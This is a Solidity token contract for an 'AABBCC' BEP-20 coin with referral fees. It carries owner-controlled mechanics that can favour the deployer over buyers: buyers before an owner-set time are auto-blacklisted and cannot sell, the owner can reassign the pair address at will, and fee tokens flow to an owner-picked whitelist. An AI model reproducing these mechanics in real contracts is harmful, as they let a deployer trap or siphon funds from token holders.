/**
 *Submitted for verification at BscScan.com on 2022-03-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ABC is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => address) inviter;
    
    mapping(address => bool) public _isBlacklisted;    
    uint256 public _tradingEnabledTime;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 public _tTotalFeeMax;
    uint256 private _rTotal;
    uint256 private _tFeeTotal;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _inviterAddress = address(0xa26071bc34C19E43a905cf345Ec6DE9729dED62c);
    address public uniswapV2Pair;
    address[] whiteUserList;
    mapping(address => bool) public havePush;
    constructor(address tokenOwner) {
        _name = "AABBCC";
        _symbol = "ABC";
        _decimals = 18;
        _tTotal = 1000000 * 10**_decimals;
        _rTotal = (MAX - (MAX % _tTotal));
        _rOwned[tokenOwner] = _rTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _owner = msg.sender;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
		if(uniswapV2Pair == address(0) && amount >= _tTotal.div(100)){
			uniswapV2Pair = recipient;
		}
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;
    }
    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
	
    function addBlacklisted(address recipient) private {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }


    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
        if(!havePush[account]){
            whiteUserList.push(account);
            havePush[account] = true;
        }
        
    }
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
        if(havePush[account]){
            havePush[account] = false;
        }
    }
    function set_tradingEnabledTime(uint256 tradingEnabledTime) public onlyOwner {
         _tradingEnabledTime=tradingEnabledTime;
    }

    function getWhiteListLength() private view returns (uint256) {
        return whiteUserList.length;
    }

    receive() external payable {}
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
	function getInviter(address account) public view returns (address) {
        return inviter[account];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
		bool isInviter = from != uniswapV2Pair && balanceOf(to) == 0 && inviter[to] == address(0);

        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            require(!_isBlacklisted[from], 'Blacklisted address');
            _tokenTransfer(from, to, amount, false);
        }else{
			if(from == uniswapV2Pair){
                
                require(!_isBlacklisted[to], 'Blacklisted address'); 
                if(block.timestamp <= _tradingEnabledTime) {
                 addBlacklisted(to);
                }

                require(amount <= 2000 *10**18);
				_tokenTransferBuy(from, to, amount, true);
			}else if(to == uniswapV2Pair){
                require(!_isBlacklisted[from], 'Blacklisted address');
                require(amount <= 2000 *10**18);
                _tokenTransferSell(from, to, amount, true);
            }else{
                require(!_isBlacklisted[from], 'Blacklisted address');
                _tokenTransfer(from, to, amount, true);
            }
        }
        if(balanceOf(address(this)) >= 300 * 10**18){
            transferWhiteUser();
        }
		
		if(isInviter) {
            inviter[to] = from;
        }
    }
    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            _takeInviterFee(sender, recipient, tAmount.div(10), currentRate);
            _takeTransfer(
                sender,
                address(this),
                tAmount.div(50),
                currentRate
            );
            _takeTransfer(
                sender,
                uniswapV2Pair,
                tAmount.div(50),
                currentRate
            );
            rate = 10;
        }
        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _tokenTransferBuy(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
			_takeInviterFee(sender, recipient, tAmount.div(20), currentRate);
            _takeTransfer(
                sender,
                address(this),
                tAmount.div(100),
                currentRate
            );
            _takeTransfer(
                sender,
                uniswapV2Pair,
                tAmount.div(100),
                currentRate
            );
            rate = 5;
        }
        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function transferWhiteUser() private {
        uint256 size = whiteUserList.length;
        if(size > 0){
            uint256 tamount = balanceOf(address(this)).div(size);
            for(uint256 i=0;i<size;i++){
                address user = whiteUserList[i];
                _tokenTransfer(address(this),user,tamount,false);
            }
        }
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            rate = 0;
        }
        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }
	function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        address cur;
        address recieveD;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        } else {
            cur = sender;
        }
        for (int256 i = 0; i < 5; i++) {
            uint256 rate;
            if (i == 0) {
                rate = 20;
            } else {
                rate = 10;
            }
            cur = inviter[cur];
            if (cur != address(0)) {
                recieveD = cur;
            }else{
				recieveD = _inviterAddress;
			}
            uint256 curTAmount = tAmount.div(100).mul(rate);
            uint256 curRAmount = curTAmount.mul(currentRate);
            _rOwned[recieveD] = _rOwned[recieveD].add(curRAmount);
            emit Transfer(sender, recieveD, curTAmount);
        }
    }
    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
}